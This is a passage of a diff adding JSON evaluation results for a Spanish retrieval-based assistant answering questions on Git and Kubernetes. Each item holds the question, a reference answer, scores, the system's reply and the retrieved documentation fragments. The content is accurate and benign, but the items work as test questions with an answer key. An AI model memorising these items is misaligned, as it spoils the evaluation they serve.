+          "seccion": "Guardado rápido y Limpieza > Limpiando tu Directorio de Trabajo",
+          "confidencialidad": "publico",
+          "puntuacion": 0.6993
+        },
+        {
+          "texto": "Guardado rápido y Limpieza > Limpiando tu Directorio de Trabajo\nAsumiendo que quieres eliminar los archivos cruft o limpiar tu directorio de trabajo, puedes hacerlo con `git clean`. Para remover los archivos que no están bajo el control de la versión en tu directorio de trabajo, puedes ejecutar `git clean -f -d`, el cual remueve cualquier archivo y también cualquier subdirectorio que se vuelva vacío como resultado. El `-f` significa 'fuerza' o “realmente haz esto”.  \nSi alguna vez quieres ver que haría, puedes ejecutar el comando con la opción `-n` que significa ``haz un arranque en seco y dime que habrías eliminado ''.  \n```\n$ git clean -d -n\nWould remove test.o\nWould remove tmp/\n```",
+          "fuente": "14-git-stash-y-clean.md",
+          "seccion": "Guardado rápido y Limpieza > Limpiando tu Directorio de Trabajo",
+          "confidencialidad": "publico",
+          "puntuacion": 0.5126
+        },
+        {
+          "texto": "Guardado rápido y Limpieza > Limpiando tu Directorio de Trabajo\nFinalmente, puede que no quieras hacer guardado rápido de algo de trabajo o de archivos en tu directorio de trabajo, pero quieres deshacerte de ellos. El comando `git clean` hará esto por ti.  \nAlgunas razones comunes para esto pueden ser: remover archivos cruft que han sido generados por herramientas de combinación o externas, o para eliminar viejos archivos de versión con el fin de ejecutar una versión limpia.  \nQuerrás ser más bien delicado con este comando, ya que está diseñado para eliminar archivos de tu directorio de trabajo que no están siendo tomados en cuenta. Si cambias de opinión, muchas veces no hay restauración para el contenido de esos archivos. Una opción más segura es ejecutar `git stash --all` para eliminar todo, pero lo almacena en un guardado.",
+          "fuente": "14-git-stash-y-clean.md",
+          "seccion": "Guardado rápido y Limpieza > Limpiando tu Directorio de Trabajo",
+          "confidencialidad": "publico",
+          "puntuacion": 0.2381
+        },
+        {
+          "texto": "Guardado rápido y Limpieza > Limpiando tu Directorio de Trabajo\n$ git clean -n -d -x\nWould remove build.TMP\nWould remove test.o\nWould remove tmp/\n```  \nSi no sabes lo que el comando `git clean` va a hacer, siempre ejecútalo con un `-n` primero para estar seguro antes de cambiar el `-n` a `-f` y hacerlo de verdad. La otra forma en la que puedes ser cuidadoso con el proceso es ejecutarlo con el `-i` o con la flag ``interactive''.  \nEsto ejecutará el comando en limpio en un modo interactivo.  \n```\n$ git clean -x -i\nWould remove the following items:\nbuild.TMP  test.o\n*** Commands ***\n1: clean                2: filter by pattern    3: select by numbers    4: ask each             5: quit\n6: help\nWhat now>\n```  \nDe esta forma puedes decidir por cada archivo individualmente o especificar los términos para la eliminación de forma interactiva.",
+          "fuente": "14-git-stash-y-clean.md",
+          "seccion": "Guardado rápido y Limpieza > Limpiando tu Directorio de Trabajo",
+          "confidencialidad": "publico",
+          "puntuacion": 0.1929
+        },
+        {
+          "texto": "Guardando cambios en el Repositorio > Revisando el Estado de tus Archivos\nLa herramienta principal para determinar qué archivos están en qué estado es el comando `git status`.\nSi ejecutas este comando inmediatamente después de clonar un repositorio, deberías ver algo como esto:  \n```\n$ git status\nOn branch master\nnothing to commit, working directory clean\n```  \nEsto significa que tienes un directorio de trabajo limpio - en otras palabras, que no hay archivos rastreados y modificados.\nAdemás, Git no encuentra archivos sin rastrear, de lo contrario aparecerían listados aquí.\nFinalmente, el comando te indica en cuál rama estás y te informa que no ha variado con respecto a la misma rama en el servidor.\nPor ahora, la rama siempre será ``master'', que es la rama por defecto; no le prestaremos atención de momento.\ntratará en detalle las ramas y las referencias.",
+          "fuente": "10-git-guardar-cambios.md",
+          "seccion": "Guardando cambios en el Repositorio > Revisando el Estado de tus Archivos",
+          "confidencialidad": "publico",
+          "puntuacion": 0.1589
+        }
+      ]
+    },
+    {
+      "id": 7,
+      "tipo": "factual",
+      "pregunta": "¿Cuándo se ejecuta el hook pre-commit y para qué se usa?",
+      "con_respuesta": true,
+      "referencia": "Es el primero en ejecutarse, antes de escribir el mensaje de confirmación. Se usa para inspeccionar lo que se va a confirmar, por ejemplo ejecutar pruebas o revisar el código.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": null,
+      "intentos": 0,
+      "error": null,
+      "segundos": 9.9,
+      "respuesta": "El punto de enganche `pre-commit` se activa incluso antes de que teclées el mensaje de confirmación. Se utiliza principalmente para inspeccionar la instantánea (snapshot) que vas a confirmar, para asegurar que las pruebas se ejecutan y revisar cualquier aspecto del código que necesites inspeccionar, como por ejemplo lanzar `lint` o revisar los espacios en blanco [1].",
+      "respuesta_cruda": "El punto de enganche `pre-commit` se activa incluso antes de que teclées el mensaje de confirmación. Se utiliza principalmente para inspeccionar la instantánea (snapshot) que vas a confirmar, para asegurar que las pruebas se ejecutan y revisar cualquier aspecto del código que necesites inspeccionar, como por ejemplo lanzar `lint` o revisar los espacios en blanco [1].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Puntos de enganche en Git > Puntos de enganche del lado cliente > Puntos en el flujo de trabajo de confirmación de cambios\nLos primeros cuatro puntos de enganche están relacionados con el proceso de\nconfirmación de cambios.  \nPrimero se activa el punto de enganche `pre-commit`, incluso antes de que\nteclees el mensaje de confirmación. Se suele utilizar para inspeccionar\nla instantánea (snapshot) que vas a confirmar, para ver si has olvidado\nalgo, para asegurar que las pruebas se ejecutan, o para revisar cualquier\naspecto que necesites inspeccionar en el código. Saliendo con un valor\nde retorno distinto de cero, se aborta la confirmación de cambios. Aunque\nsiempre puedes saltártelo con la orden `git commit --no-verify`. Puede ser\nútil para realizar tareas tales como revisar el estilo del código\n(lanzando `lint` o algo equivalente), revisar los espacios en blanco de",
+          "fuente": "15-git-hooks.md",
+          "seccion": "Puntos de enganche en Git > Puntos de enganche del lado cliente > Puntos en el flujo de trabajo de confirmación de cambios",
+          "confidencialidad": "publico",
+          "puntuacion": 0.3975
+        },
+        {
+          "texto": "Puntos de enganche en Git > Puntos de enganche del lado cliente > Otros puntos de enganche del lado cliente\nEl punto `pre-rebase` se activa antes de cualquier reorganización y puede\nabortarla si retorna con un código de salida distinto de cero. Puedes usarlo\npara impedir reorganizaciones de cualquier confirmación de cambios ya enviada\n(push) a algún servidor.  El script de ejemplo para `pre-rebase` hace\nprecisamente eso, aunque asumiendo que `next` es el nombre de la rama\npublicada. Si lo vas a utilizar, tendrás que modificarlo para que se ajuste al\nnombre que tenga tu rama publicada.  \nEl punto de enganche `post-rewrite` se ejecuta con los comandos que reemplazan\nconfirmaciones de cambio, como `git commit --amend` y `git rebase` (pero no con\n`git filter-branch`). Su único argumento es el comando que disparará la\nreescritura, y recibe una lista de reescrituras por la entrada estándar",
+          "fuente": "15-git-hooks.md",
+          "seccion": "Puntos de enganche en Git > Puntos de enganche del lado cliente > Otros puntos de enganche del lado cliente",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0573
+        },
+        {
+          "texto": "Puntos de enganche en Git > Puntos de enganche del lado cliente > Puntos en el flujo de trabajo de confirmación de cambios\n(lanzando `lint` o algo equivalente), revisar los espacios en blanco de\nrelleno (el script de ejemplo hace exactamente eso), o revisar si todos\nlos nuevos métodos llevan la adecuada documentación.  \nEl punto de enganche `prepare-commit-msg` se activa antes de arrancar\nel editor del mensaje de confirmación de cambios, pero después de crearse\nel mensaje por defecto. Te permite editar el mensaje por defecto, antes\nde que lo vea el autor de la confirmación de cambios. Este punto de\nenganche recibe varias entradas: la ubicación (path) del archivo temporal\ndonde se almacena el mensaje de confirmación, el tipo de confirmación y la\nclave SHA-1 si estamos enmendando un `commit` existente. Este punto de enganche\nno tiene mucha utilidad para las confirmaciones de cambios normales; pero sí",
+          "fuente": "15-git-hooks.md",
+          "seccion": "Puntos de enganche en Git > Puntos de enganche del lado cliente > Puntos en el flujo de trabajo de confirmación de cambios",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0283
+        },
+        {
+          "texto": "Puntos de enganche en Git\nAl igual que en otros sistemas de control de versiones, Git también cuenta\ncon mecanismos para lanzar scripts de usuario cuando suceden ciertas acciones\nimportantes, llamados puntos de enganche (hooks). Hay dos grupos de esos\npuntos de lanzamiento: los del lado\ncliente y los del lado servidor. Los puntos de enganche del lado cliente están relacionados\ncon operaciones tales como la confirmación de cambios (commit) o la fusión\n(merge). Los del lado servidor están relacionados con operaciones tales como\nla recepción de contenidos enviados (push) a un servidor. Estos puntos de\nenganche pueden utilizarse para multitud de aplicaciones. Vamos a ver unas\npocas de ellas.",
+          "fuente": "15-git-hooks.md",
+          "seccion": "Puntos de enganche en Git",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0235
+        },
+        {
+          "texto": "Puntos de enganche en Git > Puntos de enganche del lado cliente > Puntos en el flujo de trabajo de confirmación de cambios\ndel proyecto o el mensaje de confirmación antes de permitir continuar. En\nla última parte de este capítulo, veremos cómo podemos utilizar este punto\nde enganche para revisar si el mensaje de confirmación es conforme a un\ndeterminado patrón obligatorio.  \nDespués de completar todo el proceso de confirmación de cambios, es cuando\nse lanza el punto de enganche `post-commit`. Este no recibe ningún parámetro,\npero podemos obtener fácilmente la última confirmación de cambios con el\ncomando `git log -1 HEAD`. Habitualmente, este script final se suele utilizar\npara realizar notificaciones o tareas similares.",
+          "fuente": "15-git-hooks.md",
+          "seccion": "Puntos de enganche en Git > Puntos de enganche del lado cliente > Puntos en el flujo de trabajo de confirmación de cambios",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0021
+        }
+      ]
+    },
+    {
+      "id": 8,
+      "tipo": "factual",
+      "pregunta": "¿Qué es un Pod en Kubernetes?",
+      "con_respuesta": true,
+      "referencia": "La unidad de computación desplegable más pequeña de Kubernetes: un grupo de uno o más contenedores con almacenamiento y red compartidos.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": null,
+      "intentos": 0,
+      "error": null,
+      "segundos": 11.75,
+      "respuesta": "Un _Pod_ (como en una vaina de ballenas o vaina de guisantes) es un grupo de uno o más contenedores, con almacenamiento y red compartidos, y unas especificaciones de cómo ejecutar los contenedores. Los contenidos de un Pod son siempre copubicados, coprogramados y ejecutados en un contexto compartido [1]. Un Pod modela un \"host lógico\" específico de la aplicación: contiene uno o más contenedores de aplicaciones relativamente entrelazadas.\n\nLos contenedores dentro de un Pod comparten dirección IP y puerto, y pueden encontrarse a través de `localhost`. También pueden comunicarse entre sí mediante comunicaciones estándar entre procesos, como semáforos de SystemV o la memoria compartida POSIX. Los contenedores en diferentes Pods tienen direcciones IP distintas y no pueden comunicarse por IPC sin configuración especial [4].\n\nAdemás, las aplicaciones dentro de un Pod también tienen acceso a volúmenes compartidos, que se definen como parte del Pod y están disponibles para ser montados en el sistema de archivos de cada aplicación [5]. En términos de Docker, un Pod se modela como un grupo de contenedores de Docker con namespaces y volúmenes de sistemas de archivos compartidos.",
+      "respuesta_cruda": "Un _Pod_ (como en una vaina de ballenas o vaina de guisantes) es un grupo de uno o más contenedores, con almacenamiento y red compartidos, y unas especificaciones de cómo ejecutar los contenedores. Los contenidos de un Pod son siempre copubicados, coprogramados y ejecutados en un contexto compartido [1]. Un Pod modela un \"host lógico\" específico de la aplicación: contiene uno o más contenedores de aplicaciones relativamente entrelazadas.\n\nLos contenedores dentro de un Pod comparten dirección IP y puerto, y pueden encontrarse a través de `localhost`. También pueden comunicarse entre sí mediante comunicaciones estándar entre procesos, como semáforos de SystemV o la memoria compartida POSIX. Los contenedores en diferentes Pods tienen direcciones IP distintas y no pueden comunicarse por IPC sin configuración especial [4].\n\nAdemás, las aplicaciones dentro de un Pod también tienen acceso a volúmenes compartidos, que se definen como parte del Pod y están disponibles para ser montados en el sistema de archivos de cada aplicación [5]. En términos de Docker, un Pod se modela como un grupo de contenedores de Docker con namespaces y volúmenes de sistemas de archivos compartidos.",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Pods > ¿Qué és un Pod?\nUn _Pod_ (como en una vaina de ballenas o vaina de guisantes) es un grupo de uno o más contenedores (como contenedores Docker), con almacenamiento/red compartidos, y unas especificaciones de cómo ejecutar los contenedores. Los contenidos de un Pod son siempre coubicados, coprogramados y ejecutados en un contexto compartido. Un Pod modela un \"host lógico\" específico de la aplicación: contiene uno o más contenedores de aplicaciones relativamente entrelazados. Antes de la llegada de los contenedores, ejecutarse en la misma máquina física o virtual significaba ser ejecutado en el mismo host lógico.  \nMientras que Kubernetes soporta más runtimes de contenedores a parte de Docker, este último es el más conocido y ayuda a describir Pods en términos de Docker.",
+          "fuente": "03-k8s-pods.md",
+          "seccion": "Pods > ¿Qué és un Pod?",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9996
+        },
+        {
+          "texto": "Pods > API\nPod es un recurso de nivel superior en la API REST de Kubernetes.\nLa definición de objeto de API Pod\ndescribe el objeto en detalle.",
+          "fuente": "03-k8s-pods.md",
+          "seccion": "Pods > API",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9976
+        },
+        {
+          "texto": "Pods\nLos _Pods_ son las unidades de computación desplegables más pequeñas que se pueden crear y gestionar en Kubernetes.",
+          "fuente": "03-k8s-pods.md",
+          "seccion": "Pods",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9946
+        },
+        {
+          "texto": "Pods > ¿Qué és un Pod?\nEl contexto compartido de un Pod es un conjunto de namespaces de Linux, cgroups y, potencialmente, otras facetas de aislamiento, las mismas cosas que aíslan un contenedor Docker. Dentro del contexto de un Pod, las aplicaciones individuales pueden tener más subaislamientos aplicados.  \nLos contenedores dentro de un Pod comparten dirección IP y puerto, y pueden encontrarse a través de `localhost`. También pueden comunicarse entre sí mediante comunicaciones estándar entre procesos, como semáforos de SystemV o la memoria compartida POSIX. Los contenedores en diferentes Pods tienen direcciones IP distintas y no pueden comunicarse por IPC sin configuración especial.\nEstos contenedores normalmente se comunican entre sí a través de las direcciones IP del Pod.",
+          "fuente": "03-k8s-pods.md",
+          "seccion": "Pods > ¿Qué és un Pod?",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9758
+        },
+        {
+          "texto": "Pods > ¿Qué és un Pod?\nEstos contenedores normalmente se comunican entre sí a través de las direcciones IP del Pod.  \nLas aplicaciones dentro de un Pod también tienen acceso a volúmenes compartidos, que se definen como parte de un Pod y están disponibles para ser montados en el sistema de archivos de cada aplicación.  \nEn términos de Docker, un Pod se modela como un grupo de contenedores de Docker con namespaces y volúmenes de sistemas de archivos compartidos.",
+          "fuente": "03-k8s-pods.md",
+          "seccion": "Pods > ¿Qué és un Pod?",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9139
+        }
+      ]
+    },
+    {
+      "id": 9,
+      "tipo": "numerico",
+      "pregunta": "Por defecto, ¿cuántos Pods pueden quedar no disponibles durante la actualización de un Deployment?",
+      "con_respuesta": true,
+      "referencia": "Como máximo el 25% (maxUnavailable), y como máximo un 25% por encima del número deseado (maxSurge).",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": null,
+      "intentos": 0,
+      "error": null,
+      "segundos": 10.86,
+      "respuesta": "Por defecto, el número máximo de Pods que pueden quedar no disponibles durante la actualización de un Deployment es del 25%. Esto se puede ver en los documentos [1] y [2]. Ambas fuentes indican consistentemente este valor predeterminado.",
+      "respuesta_cruda": "Por defecto, el número máximo de Pods que pueden quedar no disponibles durante la actualización de un Deployment es del 25%. Esto se puede ver en los documentos [1] y [2]. Ambas fuentes indican consistentemente este valor predeterminado.",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Deployment > Escribir una especificación de Deployment > Estrategia\n`.spec.strategy.rollingUpdate.maxUnavailable` es un campo opcional que indica el número máximo\nde Pods que pueden no estar disponibles durante el proceso de actualización. El valor puede ser un número absoluto (por ejemplo, 5)\no un porcentaje de los Pods deseados (por ejemplo, 10%). El número absoluto se calcula a partir del porcentaje\ncon redondeo a la baja. El valor no puede ser 0 si `.spec.strategy.rollingUpdate.maxSurge` es 0. El valor predeterminado es 25%.  \nPor ejemplo, cuando este valor es 30%, el ReplicaSet viejo puede escalarse al 70% de los\nPods deseados de forma inmediata tras comenzar el proceso de actualización. Una vez que los Pods están listos,\nel ReplicaSet viejo puede reducirse aún mas, seguido de un escalado del nuevo ReplicaSet,",
+          "fuente": "04-k8s-deployments.md",
+          "seccion": "Deployment > Escribir una especificación de Deployment > Estrategia",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9964
+        },
+        {
+          "texto": "Deployment > Actualizar un Deployment\nkubectl get pods\n```\n```\nNAME                                READY     STATUS    RESTARTS   AGE\nnginx-deployment-1564180365-khku8   1/1       Running   0          14s\nnginx-deployment-1564180365-nacti   1/1       Running   0          14s\nnginx-deployment-1564180365-z9gth   1/1       Running   0          14s\n```  \nLa próxima vez que quieras actualizar estos Pods, sólo necesitas actualizar la plantilla Pod del Deployment otra vez.  \nEl Deployment permite garantizar que sólo un número determinado de Pods puede eliminarse mientras se están actualizando.\nPor defecto, garantiza que al menos el 25% menos del número deseado de Pods se está ejecutando (máx. 25% no disponible).",
+          "fuente": "04-k8s-deployments.md",
+          "seccion": "Deployment > Actualizar un Deployment",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9947
+        },
+        {
+          "texto": "Deployment > Actualizar un Deployment\nEl Deployment también permite garantizar que sólo un número determinado de Pods puede crearse por encima del número deseado de\nPods. Por defecto, garantiza que al menos el 25% más del número deseado de Pods se está ejecutando (máx. 25% de aumento).  \nPor ejemplo, si miras detenidamente el Deployment de arriba, verás que primero creó un Pod,\nluego eliminó algunos viejos Pods y creó otros nuevos. No elimina los viejos Pods hasta que un número suficiente de\nnuevos Pods han arrancado, y no crea nuevos Pods hasta que un número suficiente de viejos Pods se han eliminado.\nDe esta forma, asegura que el número de Pods disponibles siempre es al menos 2, y el número de Pods totales es cómo máximo 4.  \n```shell\nkubectl describe deployments\n```\n```\nName:                   nginx-deployment",
+          "fuente": "04-k8s-deployments.md",
+          "seccion": "Deployment > Actualizar un Deployment",
+          "confidencialidad": "publico",
+          "puntuacion": 0.992
+        },
+        {
+          "texto": "Deployment > Escribir una especificación de Deployment > Tiempo mínimo para considerar el Pod disponible\n`.spec.minReadySeconds` es un campo opcional que indica el número mínimo de segundos en que\nun Pod recién creado debería estar listo sin que falle ninguno de sus contenedores, para que se considere disponible.\nPor defecto su valor es 0 (el Pod se considera disponible en el momento que está listo). Para aprender más acerca de\ncuándo un Pod se considera que está listo, ver las pruebas de contenedor.",
+          "fuente": "04-k8s-deployments.md",
+          "seccion": "Deployment > Escribir una especificación de Deployment > Tiempo mínimo para considerar el Pod disponible",
+          "confidencialidad": "publico",
+          "puntuacion": 0.8459
+        },
+        {
+          "texto": "Deployment > Escribir una especificación de Deployment > Estrategia\nel ReplicaSet viejo puede reducirse aún mas, seguido de un escalado del nuevo ReplicaSet,\nasegurándose que el número total de Pods disponibles en todo momento durante la actualización\nes de al menos el 70% de los Pods deseados.  \n##### Número máximo de pods por encima del número deseado  \n`.spec.strategy.rollingUpdate.maxSurge` es un campo opcional que indica el número máximo de Pods\nque puede crearse por encima del número deseado de Pods. El valor puede ser un número absoluto (por ejemplo, 5)\no un porcentaje de los Pods deseados (por ejemplo, 10%). El valor no puede ser 0 si `MaxUnavailable` es 0.\nEl número absoluto se calcula a partir del porcentaje con redondeo al alza. El valor predeterminado es 25%.",
+          "fuente": "04-k8s-deployments.md",
+          "seccion": "Deployment > Escribir una especificación de Deployment > Estrategia",
+          "confidencialidad": "publico",
+          "puntuacion": 0.784
+        }
+      ]
+    },
+    {
+      "id": 10,
+      "tipo": "codigo_exacto",
+      "pregunta": "¿Cómo vuelvo a una revisión anterior de un Deployment?",
+      "con_respuesta": true,
+      "referencia": "Con kubectl rollout undo; con --to-revision se elige una revisión concreta.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": null,
+      "intentos": 0,
+      "error": null,
+      "segundos": 13.07,
+      "respuesta": "Para volver a una revisión anterior de un Deployment, puedes usar el comando `kubectl rollout undo`. Este comando permite revertir al despliegue actual y retrocederlo a la revisión previa:\n\n```shell\nkubectl rollout undo deployment.v1.apps/nginx-deployment\n```\n\nAlternativamente, si deseas retroceder específicamente a una versión de revisión determinada, puedes usar el parámetro `--to-revision` seguido del número de la revisión que deseas restaurar:\n\n```shell\nkubectl rollout undo deployment.v1.apps/nginx-deployment --to-revision=2\n```\n\nEstos comandos revertirán el Deployment a una versión previa estable [1][4].",
+      "respuesta_cruda": "Para volver a una revisión anterior de un Deployment, puedes usar el comando `kubectl rollout undo`. Este comando permite revertir al despliegue actual y retrocederlo a la revisión previa:\n\n```shell\nkubectl rollout undo deployment.v1.apps/nginx-deployment\n```\n\nAlternativamente, si deseas retroceder específicamente a una versión de revisión determinada, puedes usar el parámetro `--to-revision` seguido del número de la revisión que deseas restaurar:\n\n```shell\nkubectl rollout undo deployment.v1.apps/nginx-deployment --to-revision=2\n```\n\nEstos comandos revertirán el Deployment a una versión previa estable [1][4].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Deployment > Revertir un Deployment > Retroceder a una Revisión Previa\nAhora has decidido que quieres deshacer el despliegue actual y retrocederlo a la revisión previa:  \n```shell\nkubectl rollout undo deployment.v1.apps/nginx-deployment\n```\n```\ndeployment.apps/nginx-deployment\n```  \nAlternativamente, puedes retroceder a una revisión específica con el parámetro `--to-revision`:  \n```shell\nkubectl rollout undo deployment.v1.apps/nginx-deployment --to-revision=2\n```\n```\ndeployment.apps/nginx-deployment\n```  \nPara más detalles acerca de los comandos relacionados con las revisiones de un Deployment, echa un vistazo a `kubectl rollout`.  \nEl Deployment se ha revertido ahora a una revisión previa estable. Como se puede comprobar, el controlador del Deployment genera un evento `DeploymentRollback`\nal retroceder a la revisión 2.  \n```shell",
+          "fuente": "04-k8s-deployments.md",
+          "seccion": "Deployment > Revertir un Deployment > Retroceder a una Revisión Previa",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9972
+        },
+        {
+          "texto": "Deployment > Revertir un Deployment\nOtras actualizaciones, como escalar el Deployment,\nno generan una nueva revisión del Deployment, para poder facilitar el escalado manual simultáneo - o auto-escalado.\nEsto significa que cuando reviertes a una versión anterior, sólo la parte de la plantilla Pod del Deployment se revierte.  \nVamos a suponer que hemos cometido un error al actualizar el Deployment, poniendo como nombre de imagen `nginx:1.91` en vez de `nginx:1.9.1`:  \n```shell\nkubectl set image deployment.v1.apps/nginx-deployment nginx=nginx:1.91 --record=true\n```\n```\ndeployment.apps/nginx-deployment image updated\n```  \nEl despliegue se atasca y no progresa.  \n```shell\nkubectl rollout status deployment.v1.apps/nginx-deployment\n```\n```\nWaiting for rollout to finish: 1 out of 3 new replicas have been updated...\n```",
+          "fuente": "04-k8s-deployments.md",
+          "seccion": "Deployment > Revertir un Deployment",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9935
+        },
+        {
+          "texto": "Deployment > Revertir un Deployment\n13s       13s         1       {deployment-controller }                Normal      ScalingReplicaSet   Scaled down replica set nginx-deployment-2035384211 to 0\n13s       13s         1       {deployment-controller }                Normal      ScalingReplicaSet   Scaled up replica set nginx-deployment-3066724191 to 1\n```  \nPara arreglar este problema, necesitas volver a una revisión previa del Deployment que sea estable.",
+          "fuente": "04-k8s-deployments.md",
+          "seccion": "Deployment > Revertir un Deployment",
+          "confidencialidad": "publico",
+          "puntuacion": 0.979
+        },
+        {
+          "texto": "Deployment > Revertir un Deployment > Retroceder a una Revisión Previa\nNormal  DeploymentRollback  15s   deployment-controller  Rolled back deployment \"nginx-deployment\" to revision 2\nNormal  ScalingReplicaSet   15s   deployment-controller  Scaled down replica set nginx-deployment-595696685f to 0\n```",
+          "fuente": "04-k8s-deployments.md",
+          "seccion": "Deployment > Revertir un Deployment > Retroceder a una Revisión Previa",
+          "confidencialidad": "publico",
+          "puntuacion": 0.97
+        },
+        {
+          "texto": "Deployment > Revertir un Deployment > Retroceder a una Revisión Previa\nNormal  ScalingReplicaSet   11m   deployment-controller  Scaled up replica set nginx-deployment-c4747d96c to 1\nNormal  ScalingReplicaSet   11m   deployment-controller  Scaled down replica set nginx-deployment-75675f5897 to 2\nNormal  ScalingReplicaSet   11m   deployment-controller  Scaled up replica set nginx-deployment-c4747d96c to 2\nNormal  ScalingReplicaSet   11m   deployment-controller  Scaled down replica set nginx-deployment-75675f5897 to 1\nNormal  ScalingReplicaSet   11m   deployment-controller  Scaled up replica set nginx-deployment-c4747d96c to 3\nNormal  ScalingReplicaSet   11m   deployment-controller  Scaled down replica set nginx-deployment-75675f5897 to 0\nNormal  ScalingReplicaSet   11m   deployment-controller  Scaled up replica set nginx-deployment-595696685f to 1",
+          "fuente": "04-k8s-deployments.md",
+          "seccion": "Deployment > Revertir un Deployment > Retroceder a una Revisión Previa",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9564
+        }
+      ]
+    },
+    {
+      "id": 11,
+      "tipo": "factual",
+      "pregunta": "¿Puedo guardar contraseñas en un ConfigMap?",
+      "con_respuesta": true,
+      "referencia": "No es lo adecuado: un ConfigMap no proporciona cifrado. Para datos confidenciales hay que usar un Secret.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": null,
+      "intentos": 0,
+      "error": null,
+      "segundos": 10.38,
+      "respuesta": "No, no puedes guardar contraseñas en un ConfigMap ya que ConfigMap no proporciona encriptación. Si los datos que quieres almacenar son confidenciales, debes utilizar un Secret en lugar de un ConfigMap o usar otras herramientas externas para mantener los datos seguros [1].",
+      "respuesta_cruda": "No, no puedes guardar contraseñas en un ConfigMap ya que ConfigMap no proporciona encriptación. Si los datos que quieres almacenar son confidenciales, debes utilizar un Secret en lugar de un ConfigMap o usar otras herramientas externas para mantener los datos seguros [1].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "ConfigMaps\nUn configmap es un objeto de la API utilizado para almacenar datos no confidenciales en el formato clave-valor. Los Pods pueden utilizar los ConfigMaps como variables de entorno, argumentos de la linea de comandos o como ficheros de configuración en un Volumen.  \nUn ConfigMap te permite desacoplar la configuración de un entorno específico de una imagen de contenedor, así las aplicaciones son fácilmente portables.  \n> **Nota:**\nConfigMap no proporciona encriptación.\nSi los datos que quieres almacenar son confidenciales, utiliza un\nSecret en lugar de un ConfigMap,\no utiliza otras herramientas externas para mantener los datos seguros.",
+          "fuente": "05-k8s-configmaps.md",
+          "seccion": "ConfigMaps",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9717
+        },
+        {
+          "texto": "ConfigMaps > Objeto ConfigMap\nUn ConfigMap es un objeto de la API\nque permite almacenar la configuración de otros objetos utilizados. Aunque muchos\nobjetos de kubernetes que tienen un `spec`, un ConfigMap tiene una sección `data` para\nalmacenar items, identificados por una clave, y sus valores.  \nEl nombre del ConfigMap debe ser un\nnombre de subdominio DNS válido.",
+          "fuente": "05-k8s-configmaps.md",
+          "seccion": "ConfigMaps > Objeto ConfigMap",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9093
+        },
+        {
+          "texto": "ConfigMaps > Usando ConfigMaps > Usando ConfigMaps como ficheros en un Pod\nComo resultado, el retraso total desde el momento que el ConfigMap es actualizado hasta el momento\nque las nuevas claves son proyectadas en el Pod puede ser tan largo como la sincronización del Pod\n+ el retraso de propagación de la caché, donde la propagación de la caché depende del tipo de\ncaché elegido (es igual al retraso de propagación, ttl de la caché, o cero correspondientemente).  \nLa característica alpha de kubernetes _Immutable Secrets and ConfigMaps_ provee una opción para configurar\nSecrets individuales y ConfigMaps como inmutables. Para los Clústeres que usan ConfigMaps como extensión\n(al menos decenas o cientos de un único ConfigMap montado en Pods), previene cambios en sus\ndatos con las siguientes ventajas:",
+          "fuente": "05-k8s-configmaps.md",
+          "seccion": "ConfigMaps > Usando ConfigMaps > Usando ConfigMaps como ficheros en un Pod",
+          "confidencialidad": "publico",
+          "puntuacion": 0.655
+        },
+        {
+          "texto": "ConfigMaps > Usando ConfigMaps > Usando ConfigMaps como ficheros en un Pod\n#### ConfigMaps montados son actualizados automáticamente  \nCuando un ConfigMap está siendo utilizado en un volumen y es actualizado, las claves son actualizadas también.\nEl kubelet comprueba si el ConfigMap montado está actualizado cada periodo de sincronización.\nSin embargo, el kubelet utiliza su caché local para obtener el valor actual del ConfigMap.\nEl tipo de caché es configurable usando el campo `ConfigMapAndSecretChangeDetectionStrategy` en el\nKubeletConfiguration struct.\nUn ConfigMap puede ser propagado por vista (default), ttl-based, o simplemente redirigiendo\ntodas las consultas directamente a la API.\nComo resultado, el retraso total desde el momento que el ConfigMap es actualizado hasta el momento",
+          "fuente": "05-k8s-configmaps.md",
+          "seccion": "ConfigMaps > Usando ConfigMaps > Usando ConfigMaps como ficheros en un Pod",
+          "confidencialidad": "publico",
+          "puntuacion": 0.3085
+        },
+        {
+          "texto": "ConfigMaps > ConfigMaps y Pods\nPuedes escribir un Pod `spec` y referenciarlo a un ConfigMap y configurar el contenedor(es)\nde ese Pod en base a los datos del ConfigMap. El Pod y el ConfigMap deben estar en\nel mismo Namespace.  \nEste es un ejemplo de ConfigMap que tiene algunas claves con un valor simple,\ny otras claves donde el valor tiene un formato de un fragmento de configuración.  \n```yaml\napiVersion: v1\nkind: ConfigMap\nmetadata:\nname: game-demo\ndata:\n# property-like keys; each key maps to a simple value\nplayer_initial_lives: \"3\"\nui_properties_file_name: \"user-interface.properties\"\n#\n# file-like keys\ngame.properties: |\nenemy.types=aliens,monsters\nplayer.maximum-lives=5\nuser-interface.properties: |\ncolor.good=purple\ncolor.bad=yellow\nallow.textmode=true\n```",
+          "fuente": "05-k8s-configmaps.md",
+          "seccion": "ConfigMaps > ConfigMaps y Pods",
+          "confidencialidad": "publico",
+          "puntuacion": 0.2742
+        }
+      ]
+    },
+    {
+      "id": 12,
+      "tipo": "restringido",
+      "pregunta": "¿Qué tamaño máximo puede tener un Secret?",
+      "con_respuesta": true,
